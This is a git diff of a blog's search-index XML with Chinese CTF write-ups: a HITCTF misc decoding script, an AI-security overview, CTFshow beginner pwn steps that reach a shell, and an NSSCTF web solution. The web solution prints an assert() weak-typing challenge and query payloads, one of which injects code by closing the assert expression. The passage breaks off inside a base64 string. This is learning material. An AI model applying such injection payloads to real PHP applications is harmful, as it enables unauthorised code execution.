@@ -208,58 +208,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2023HITCTF-Misc-Writeup</title>
-    <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
-    <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
-<h2 id="前言">前言</h2>
-<p>希望自己下次能有更大的贡献，太菜啦，哭哭（</p>
-<p><img src="https://s2.loli.net/2024/01/01/We3CjlQpxTPSgcK.png" alt=""></p>
-<h2 id="leftover-file">leftover file</h2>
-<p><strong>考点：Modbus协议，变异凯撒</strong></p>
-<p>首先查看了一下，发现是modbus协议相关，检查了一下相关功能码</p>
-<p><img src="https://s2.loli.net/2023/11/30/pUu1vYTSV2F8Gwe.png" alt=""></p>
-<p>发现response存在异常</p>
-<p><img src="https://s2.loli.net/2023/11/30/6vpOtLGRNk7WuCS.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/11/30/9aefbxp7ENLOMd1.png" alt="">尝试根据flag头寻找相关规律</p>
-<p><img src="https://s2.loli.net/2023/11/30/vkmWO1qZ74jMobi.png" alt=""></p>
-<p>然后每次的功能码3，进行一次新的修改操作</p>
-<p><img src="https://s2.loli.net/2023/11/30/GMP5fUcgob2DmRV.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/11/30/K1mdlh3nTRjkWJe.png" alt=""></p>
-<p><img src="https://s2.loli.net/2023/11/30/27M6IRgJvsZUCxy.png" alt=""></p>
-<p>到90 93发现flag已经格式完整</p>
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">71</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">112</span>, <span class="number">65</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">77</span>, <span class="number">96</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">93</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">68</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">93</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c[i] + i + x) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        decrypted = decrypt(c, i)</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">&quot;HIT&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> i, decrypted</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">x, flag = find(c)</span><br><span class="line"><span class="keyword">if</span> x :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2023/11/30/rz5YT8Ai2fogaIu.png" alt=""></p>
-<p>这是仅完成的一题，剩下的是根据官方wp的思路来学习的</p>
-<p>单纯菜，qwq~~</p>
-<h2 id="network-in-network">network-in-network</h2>
-<p><strong>考点：神经网络逆向</strong></p>
-<p>先来看一下官方给的</p>
-<p><img src="https://s2.loli.net/2023/11/30/3IeufHGkZVx2Bdw.png" alt=""></p>
-<p>我再研究研究，qwq</p>
-<h2 id="H1F1">H1F1</h2>
-<p><strong>考点：音频反向</strong></p>
-<p>这道题就讲一下思路吧，不想动手复现了</p>
-<p>根据官方wp和吉大师傅的简单操作了一下</p>
-<p><a href="https://mp.weixin.qq.com/s/O14tELa2JCkhJUPA7RNfRw">2023HITCTF wp (qq.com)</a></p>
-<p>只能说学到了一个新的知识：音频diff</p>
-<p>首先根据峰值将两端音频对齐，然后对其中一段音频反向</p>
-<p>可以发现下图的怪异bit点</p>
-<p><img src="https://s2.loli.net/2023/11/30/hvCyXY5inZpN6fS.png" alt=""></p>
-<p>进行读取二进制0和1，最后转字符串就行了</p>
-<h2 id="总结">总结</h2>
-<p>都什么年代了，哪还有什么传统Misc啊（乐</p>
-<p>还有这次比赛的web也确实让人有一种脑干缺失的美</p>
-<p>出题人太懂出题了（悲</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>HITCTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023Ciscn-Writeup</title>
     <url>/2023/09/28/2023Ciscn-Writeup/</url>
     <content><![CDATA[<h1>2023Ciscn-Writeup</h1>
@@ -340,6 +288,58 @@
       </categories>
       <tags>
         <tag>ciscn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2023HITCTF-Misc-Writeup</title>
+    <url>/2023/11/30/2023HITCTF-Misc-Writeup/</url>
+    <content><![CDATA[<h1>2023HITCTF-Misc-Writeup</h1>
+<h2 id="前言">前言</h2>
+<p>希望自己下次能有更大的贡献，太菜啦，哭哭（</p>
+<p><img src="https://s2.loli.net/2024/01/01/We3CjlQpxTPSgcK.png" alt=""></p>
+<h2 id="leftover-file">leftover file</h2>
+<p><strong>考点：Modbus协议，变异凯撒</strong></p>
+<p>首先查看了一下，发现是modbus协议相关，检查了一下相关功能码</p>
+<p><img src="https://s2.loli.net/2023/11/30/pUu1vYTSV2F8Gwe.png" alt=""></p>
+<p>发现response存在异常</p>
+<p><img src="https://s2.loli.net/2023/11/30/6vpOtLGRNk7WuCS.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/11/30/9aefbxp7ENLOMd1.png" alt="">尝试根据flag头寻找相关规律</p>
+<p><img src="https://s2.loli.net/2023/11/30/vkmWO1qZ74jMobi.png" alt=""></p>
+<p>然后每次的功能码3，进行一次新的修改操作</p>
+<p><img src="https://s2.loli.net/2023/11/30/GMP5fUcgob2DmRV.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/11/30/K1mdlh3nTRjkWJe.png" alt=""></p>
+<p><img src="https://s2.loli.net/2023/11/30/27M6IRgJvsZUCxy.png" alt=""></p>
+<p>到90 93发现flag已经格式完整</p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = [<span class="number">71</span>, <span class="number">71</span>, <span class="number">81</span>, <span class="number">63</span>, <span class="number">79</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">112</span>, <span class="number">65</span>, <span class="number">35</span>, <span class="number">86</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">77</span>, <span class="number">96</span>, <span class="number">91</span>, <span class="number">74</span>, <span class="number">93</span>, <span class="number">88</span>, <span class="number">71</span>, <span class="number">90</span>, <span class="number">85</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">68</span>, <span class="number">85</span>, <span class="number">90</span>, <span class="number">93</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c[i] + i + x) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        decrypted = decrypt(c, i)</span><br><span class="line">        <span class="keyword">if</span> decrypted.startswith(<span class="string">&quot;HIT&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> i, decrypted</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">x, flag = find(c)</span><br><span class="line"><span class="keyword">if</span> x :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag: <span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2023/11/30/rz5YT8Ai2fogaIu.png" alt=""></p>
+<p>这是仅完成的一题，剩下的是根据官方wp的思路来学习的</p>
+<p>单纯菜，qwq~~</p>
+<h2 id="network-in-network">network-in-network</h2>
+<p><strong>考点：神经网络逆向</strong></p>
+<p>先来看一下官方给的</p>
+<p><img src="https://s2.loli.net/2023/11/30/3IeufHGkZVx2Bdw.png" alt=""></p>
+<p>我再研究研究，qwq</p>
+<h2 id="H1F1">H1F1</h2>
+<p><strong>考点：音频反向</strong></p>
+<p>这道题就讲一下思路吧，不想动手复现了</p>
+<p>根据官方wp和吉大师傅的简单操作了一下</p>
+<p><a href="https://mp.weixin.qq.com/s/O14tELa2JCkhJUPA7RNfRw">2023HITCTF wp (qq.com)</a></p>
+<p>只能说学到了一个新的知识：音频diff</p>
+<p>首先根据峰值将两端音频对齐，然后对其中一段音频反向</p>
+<p>可以发现下图的怪异bit点</p>
+<p><img src="https://s2.loli.net/2023/11/30/hvCyXY5inZpN6fS.png" alt=""></p>
+<p>进行读取二进制0和1，最后转字符串就行了</p>
+<h2 id="总结">总结</h2>
+<p>都什么年代了，哪还有什么传统Misc啊（乐</p>
+<p>还有这次比赛的web也确实让人有一种脑干缺失的美</p>
+<p>出题人太懂出题了（悲</p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>HITCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -996,6 +996,32 @@
       </tags>
   </entry>
   <entry>
+    <title>AI-安全（1）总述</title>
+    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
+    <content><![CDATA[<h1>AI安全</h1>
+<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
+<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
+<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
+<p>这是引用的其中的一段话：</p>
+<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
+<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
+<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
+<p>学习心得及相关记录如下：</p>
+<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
+<p>AI相关CTF赛题：</p>
+<p><a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
+<p><a href="https://wh1tej0ker.github.io/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/">AI-CTF（2）LeNet | Wh1teJ0ker</a></p>
+<p><a href="https://wh1tej0ker.github.io/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/">AI-CTF（3）network-in-network | Wh1teJ0ker</a></p>
+]]></content>
+      <categories>
+        <category>AI</category>
+        <category>AI安全</category>
+      </categories>
+      <tags>
+        <tag>AI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AI-安全（2）梯度泄露攻击</title>
     <url>/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h1>梯度泄露攻击</h1>
@@ -1044,6 +1070,40 @@
       <tags>
         <tag>AI</tag>
         <tag>梯度泄露攻击</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFshow-Test_your_nc</title>
+    <url>/2024/03/08/CTFshow-Test_your_nc/</url>
+    <content><![CDATA[<h1>CTFshow-Test_your_nc</h1>
+<h2 id="pwn0">pwn0</h2>
+<p>ssh连接，输入密码123456</p>
+<p>查找一下得到flag</p>
+<p><img src="https://s2.loli.net/2024/03/08/FxsuYgliSHcoT4q.png" alt="ctfshow_testnc_1"></p>
+<h2 id="pwn1">pwn1</h2>
+<p><img src="https://s2.loli.net/2024/03/08/WMzjcUSNCZdEvPe.png" alt="ctfshow_testnc_2"></p>
+<p>ida64位反编译后，可以发现system函数可以直接利用</p>
+<p><img src="https://s2.loli.net/2024/03/08/t2X4nvOTwf1EdPV.png" alt="ctfshow_testnc_3"></p>
+<h2 id="pwn2">pwn2</h2>
+<p><img src="https://s2.loli.net/2024/03/08/A3nYUJ9dlkfvaDh.png" alt="ctfshow_testnc_4"></p>
+<p>输入cat命令即可得到flag</p>
+<p><img src="https://s2.loli.net/2024/03/08/AFjwL64dIzleqkQ.png" alt="ctfshow_testnc_5"></p>
+<h2 id="pwn3">pwn3</h2>
+<p><img src="https://s2.loli.net/2024/03/08/DmOhgtk92WQXnqH.png" alt="ctfshow_testnc_6"></p>
+<p>在system_func中发现存在system命令，可以获取flag</p>
+<p><img src="https://s2.loli.net/2024/03/08/FWBVQaUvY5PAd7b.png" alt="ctfshow_testnc_7"></p>
+<h2 id="pwn4">pwn4</h2>
+<p><img src="https://s2.loli.net/2024/03/08/ALru1Z9Cf3zHth2.png" alt="ctfshow_testnc_8"></p>
+<p>在这里可以发现存在一个字符串比较的逻辑，输入CTFshowPWN作为字符串进行比较，然后可以进行execve_func函数</p>
+<p><img src="https://s2.loli.net/2024/03/08/U5rgY49PpQf7uoA.png" alt="ctfshow_testnc_9"></p>
+<p>进入后发现已经存在可交互的shell</p>
+<p><img src="https://s2.loli.net/2024/03/08/23upfgvCyUK6xQ7.png" alt="ctfshow_testnc_10"></p>
+]]></content>
+      <categories>
+        <category>CTFshow</category>
+      </categories>
+      <tags>
+        <tag>Test_your_nc</tag>
       </tags>
   </entry>
   <entry>
@@ -1143,32 +1203,6 @@
       </categories>
       <tags>
         <tag>信息搜集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AI-安全（1）总述</title>
-    <url>/2023/11/15/AI-%E5%AE%89%E5%85%A8%EF%BC%881%EF%BC%89%E6%80%BB%E8%BF%B0/</url>
-    <content><![CDATA[<h1>AI安全</h1>
-<p>近期开始对AI安全开始研究，顺带记录下自己的学习研究过程。</p>
-<p>参考了腾讯出品的AI安全威胁矩阵。个人觉得分类相当合理，极具参考价值。</p>
-<p><a href="https://matrix.tencent.com/">AI安全威胁矩阵 </a></p>
-<p>这是引用的其中的一段话：</p>
-<p><strong>在过去的几年中，人工智能技术已在许多领域得到广泛应用，包括图像处理，语音识别，自然语言处理等。因此，在安全关键型应用程序中，人工智能技术的安全性问题日益成为人们关注的焦点。研究社区和工业公司。除了性能之外，工程师和用户还应考虑AI系统的安全性问题，并确保AI模型满足不同业务场景的需求，避免恶意控制，影响，欺诈，错误和隐私泄露所造成的严重后果。</strong></p>
-<p><strong>为了向开发人员和用户提供有关AI系统安全问题的更好指南，本矩阵旨在发布一个框架，以基于ATT＆CK范式从对手的角度阐明攻击过程和特定的攻击技术，该方法是在网络安全领域已经相对成熟。了解和识别这些技术有助于AI开发人员和维护人员在整个生命周期和相应的解决方案中认识到AI系统的潜在风险，从而为AI系统的应用和部署提供必不可少的技术保证。</strong></p>
-<p><img src="https://s2.loli.net/2023/11/14/zn3K7xhvJZCeVRf.png" alt=""></p>
-<p>学习心得及相关记录如下：</p>
-<p><a href="https://wh1tej0ker.github.io/2023/11/16/AI-%E5%AE%89%E5%85%A8%EF%BC%882%EF%BC%89%E6%A2%AF%E5%BA%A6%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB/">梯度泄露攻击 | Wh1teJ0ker</a></p>
-<p>AI相关CTF赛题：</p>
-<p><a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
-<p><a href="https://wh1tej0ker.github.io/2023/11/18/AI-CTF%EF%BC%882%EF%BC%89LeNet/">AI-CTF（2）LeNet | Wh1teJ0ker</a></p>
-<p><a href="https://wh1tej0ker.github.io/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/">AI-CTF（3）network-in-network | Wh1teJ0ker</a></p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>AI安全</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
@@ -2052,52 +2086,6 @@ FFI是PHP中调用C代码的手段
       </tags>
   </entry>
   <entry>
-    <title>NSSCTF Round-17 Basic-Writeup-Web</title>
-    <url>/2024/02/21/NSSCTF%20Round-17%20Basic-Writeup-Web/</url>
-    <content><![CDATA[<h1>NSSCTF Round-17 Basic-Writeup-Web</h1>
-<h2 id="前言">前言</h2>
-<p>一次很难评的周赛，web里藏misc，准确来说藏musc，何必呢？</p>
-<h2 id="web">web</h2>
-<h3 id="真·签到">真·签到</h3>
-<p>查看robots.txt页面可以发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hint:E794A8E688B7E5908DE7869FE68289E590972CE696B0E7949FE8B59BE58FAFE98187E8A781E8BF87E593A67E0AE8AEB0E5BE97E794A8E688B7E5908DE585A8E794A8E5B08FE58699E593A6EFBD9EEFBD9E</span><br><span class="line">username:13 44 21 15 42</span><br><span class="line">password:LF5GY3KZKRVTCT2EM54FUV2FO5GVIVLZJZ5GW6C2IRJGQTT2KU2VUR2GNJNEIYZVLJDVKPI=</span><br></pre></td></tr></table></figure>
-<p>解密得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#base16</span><br><span class="line">hint:用户名熟悉吗,新生赛可遇见过哦~</span><br><span class="line">记得用户名全用小写哦～～</span><br><span class="line">#敲击码</span><br><span class="line">username:C(K)TFER-&gt;ctfer</span><br><span class="line">#base32 base64 md5</span><br><span class="line">password:c9fa95881ea0152791d4a759dacd79de(Nss)</span><br></pre></td></tr></table></figure>
-<p>登录后查看前端</p>
-<p><img src="https://s2.loli.net/2024/02/21/lfz4DquXpoyHBvP.png" alt="NSSCTF Round"></p>
-<p>然后是一个弱类型问题</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;nss&#x27;</span>] == <span class="number">732339662</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;is_numeric(<span class="subst">$_GET</span>[nss])==0&quot;</span>) || <span class="keyword">die</span>(<span class="string">&#x27;oops!此路不通！！&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;这里不是说了吗！！！必须是 732339662 (招新群群号！)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;啊？这是什么新型比较？&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;是不是题错了啊&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>两种思路，分别讲述一下</p>
-<p>首先都是先传入数字732339662，过第一个if，然后assert函数，内部为真继续，为假结束</p>
-<p>逻辑或||的运算规则是一个为真即为真，后续不再计算，一个为假再计算右边的表达式，但是由于存在die函数，如果前面整体为真即可过，如果为假，后续进入die函数直接结束了。</p>
-<p>因此我们可以的办法就是令整体为真，此时如果传入的Nss不是字符串，则is_numeric为假=0，此时左边整体为真。</p>
-<p>此时PHP的版本是7.2.34，猜测是这个原因，所以常规的%0a%00绕过均失效，最终可用的来源于,</p>
-<p><a href="https://www.bilibili.com/read/cv20228698/">记周赛遇到的一个is_numeric问题 - 哔哩哔哩 (bilibili.com)</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662,1</span><br></pre></td></tr></table></figure>
-<p>这是一种解法，还有一种思路值得参考，通过闭合绕过，因为存在die函数会直接结束进程，所以将其闭合即可，并且后面的直接注释掉即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?nss=732339662a;)//</span><br></pre></td></tr></table></figure>
-<h3 id="真的是文件上传吗？">真的是文件上传吗？</h3>
-<p>先来看一下按照本题预期（应该</p>
-<p>最开始页面上是这个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;-------.&gt;-.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;++++++++.&gt;---------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;.&lt;&lt;&lt;-.&lt;&lt;&lt;------.&gt;&gt;&gt;++++++++.&gt;&gt;-----.&gt;++.&lt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;++++++++.--------.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++.++++++.-----------.++++++.&lt;&lt;&lt;&lt;+....&lt;.&gt;&gt;&gt;------.&gt;&gt;+++++++.----------.&lt;&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;+++.----------.++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;++.&lt;+++++.+++..&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;----.-------.&gt;-.&lt;.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;+++++++.+.+++++.&gt;--.&lt;&lt;&lt;&lt;&lt;+.</span><br></pre></td></tr></table></figure>
-<p>brainfuck解密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You want a hint?</span><br><span class="line">Give me a flag!!!!</span><br><span class="line">And you will hava hint!</span><br></pre></td></tr></table></figure>
-<p>然后get传入一个flag参数，即将迎来极其无语的一点，嵌套了n层的base，如果这是misc，我无话可说，但是这个是web，只能说一个6</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5Zac5qyi5oiRV0TnmoRiYXNl5ZCXCj0obCNhLVpeRFBCT3I7dURlczYuRzxaRUEzW1x1KUYpIzVnLFhRSFZFLiZybTdWIjg8ME8tRzRGP2BCQjVxWUpcMWhLWzcvMXQ/bEBuJnNgLnNhKkY4NTFGVTtGclFdN1JDLUFDMXA0PjFlVHFrQDhKUlNFYz4+bjVVbktLNTxWK2wsckFwcDNfaiRPPUFnUEQ0XSxyQ0FwQGQpPGJZWmE2OjxfMTgxODRKNCo9dDsvcFY+OS40ODs4NSdlbmZCTiRObzU7UWJFNUAtV2gzYjszJUYmdVs4NVl0Y3I2Nm91RzVASFdmLT06KDg+QS4+TTRFIiM+MTQ7NXEzXmtuUDc5O2ohNTpwRGU3NipHVC44VlpnNVljPkM8Xjl0TzE0OzVkLldSNCksQ0VJMj1AdGMhNSNgZSktPUt0UTNJRyRmPF1FXTgxNDIyUTRZJ2hiPlVXby8uIW9LSDVYQExxPz9lKGkwLyQ3IjVWa19aM2I8SjQ0KGc2Y0BUY1RBO2BbXWU1J0xAJTMtbydeL29QJywuISUoaDVDLVVaNXVNLGEsQFlSSDxDOXRfOFBoKlxBb3FUXTc2T2QlRC1vXDM0JVc9XDBOKTFdLjU9a048YChKIzRaNWYwMkQ/akIsQmQ6LTU6JWdLM14+QjY0WzFZVTppME5TLjhPI20xaFQ8U0IuLEgtRClQVT08Xy1bTzVUcjozNCllTF01PUpeakUkZUBzNVRzbzkuOEYvcy47MyRrLm9CO0ExNDs4OjUlUVRhMC4wLyQuVEJEOzFJNE4lQDc7ZVo1Qz9UYDVCXj09Nm9KXmA8QFY5PDc5Kko/NjZuY0Q1JzgvYUYnVUNSRiY1dDJEJ2g4OjU/cDlMNSQxbG5AVlRkWS45QiJpNVg/XStAOEpYUC9qTkdyNUB1Vzk0YGtqRjVzWzRsM1xGX2A0RCVmIjUkTFE0NXNuXk0vb3Q7Y0UoK00jMTQqQTU0KDtIL0dyQlJwPEM6MjM0PidvZDVCJ2VGNzlhRz0tdTs6WDRFIiw2QXBaNCkuNjE5UjxAZ09DNTxyK28vUyYwRixCQCFGNFoiSHQ1VTk2RDY+XiImQkw/Kjc8YWV1YDVVUzcrLjo0YEI5NSU2cS45Ql8qM15jIzRCTCNsWSxYYmNgNjZvdUU1QEkpbDUkJzRDLD4yP002Nm9aITgxSF0wNCktRHI3OTtqITUiSypRNzY8U1FBcFowWjNFOilDRC5tYzQ5TzllW0A2XCRbLENFSTJEQ2UxYjU8MHVEMG1QVHMzXyE0Ni45QU4kN3FIQzc0JyxgNzxfPzdyNUEiNF81WEBMYTUjWDBaM15jSjREQ1NJNTFJM2BCNCheMGE1Wmg+OTtgUy9TNVg4WF8yY0YzNzNcIkdcPUU/MEQxM3RXUzV1TSxzNzowc2c8LFl0dThQYUlzQktdcCgvbm9FQzxhbkknNCVWLlJBcGRtNCw7RSVePGAoSis1XCJPXS9TJFBgPlZvXGc0RDhJazVDSThpM1xpRjE6aWZvKTxAXy11MUk0TjE/Ujc/UURHYVZaLjdjajEzWz9rMDQpSFpGNVtkZjJFJF09RjVAJS9LNUNIVS41Qz9aYy5WKUZmNVhJUFA1JVFBcTkvQXRGNlNWU0E4cCMySUA2bE1WNzlzcFc1QG1WaTNGP1BcQDY2LEZAVWBQYS5uV1RjNSc4UydGJ0M3UzNdOjpuLjxtakg1P3A8MjQpLmkrLjhPN3QuISYhNzUnVDFJNXVmWCsvak5fbzVVbktTNGBqcHQ0KEwnJDNdOWxLRENbbms1WCROLjJDcj5jL28rYFtFKCsyTjFJNUFNNCg7X25HckJSczxEdW10ND4oQHRBbyheNDc2PjNgPEdQQlI0RSJPTkFwbEArLjUscDI8QFVtVTUkTHA0L1MvQzM+Vjk4WC05dFsmN3FiZToxZlExYTppVUQuPEBfJykzXj4hLC46NGBCMiojLEEuOjY6MjNiOj9VRDBCNT8sVyZoPEUkXExVNUAlUG01Q0ciZzVcalNINXNKJ3A4MT9XLzUkOWBoNUM/YVw1IksrIjc2RVlTP0AiN3EzY1MxXkQuWltbNm9JLCtANlwnREJNVlRKPF8saDo1J15DOTppbkU6M14tW241QSE7bDVYbSY8NCcsYDc+VksmZDxJQF5pNSdTQWg1I2ozazFoVDxTRENdJEs2ImFNTzVzbT5FQG1YS0Y7YElabDUnTEAlNCkmMVA3N0NGJy1yT0BwMTNtL1AzXGlLcjFnWEt1PEUhKnA0PihiRUIuUGhpNzY9Rj88YW5JRjQlV2ErQXBkbGgsO0U1SDtgWzxJNFlKKnMvUyRcWyxDM1IxNVYiLWszXyooRDRbMVpBOmo2Miw8QF85MTFoSzZXP1I3RV1EKT5JPS43W1pjNVwhO1w1VnVlJjVVOUpeRSRbO0k1WEpAQS44RXJPNzdVWnVEYTZMNjgxSF1ANSVJbzQ5L0F0QjxAXyc9OHAjMklAN2kxJDNeUXNyPF08ZlYzRj9vKzxAZmUoLjdtVEwubk1yVDUnODJfRidVQ1UzXUxBTy45QU4mNT9xbyY0WiJjWEBWVDN1LXJOUUs1J1xHYT8/QG5nL2pPO1U1QHVXOTRdP04lN1hIZ2A3UStRcjREJWxBNVg